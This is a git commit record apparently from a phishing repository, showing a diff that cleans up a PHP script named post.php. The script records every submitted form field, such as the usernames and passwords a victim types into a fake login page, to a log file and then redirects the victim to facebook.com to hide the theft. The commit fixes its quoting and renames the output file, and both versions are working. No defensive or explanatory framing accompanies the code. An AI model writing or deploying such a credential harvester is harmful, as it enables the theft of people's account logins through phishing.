75edc6693809d41ba14d872d5282e61ecaf164b9
Alluz786 <105438113+Alluz786@users.noreply.github.com>
2022-05-16 21:55:36 -0700

    Update post.php

--- post.php
+++ post.php
@@ -1,13 +1,19 @@
 <?php
-header (‘Location:http://www.facebook.com/’);
-$handle = fopen(“usernames.txt”, “a”);
+ 
+// Set the location to redirect the page
+header ('Location: http://www.facebook.com');
+ 
+// Open the text file in writing mode
+$file = fopen("log.txt", "a");
+ 
 foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, “=”);
-fwrite($handle, $value);
-fwrite($handle, “\r\n”);
+    fwrite($file, $variable);
+    fwrite($file, "=");
+    fwrite($file, $value);
+    fwrite($file, "\r\n");
 }
-fwrite($handle, “\r\n”);
-fclose($handle);
+ 
+fwrite($file, "\r\n");
+fclose($file);
 exit;
 ?>
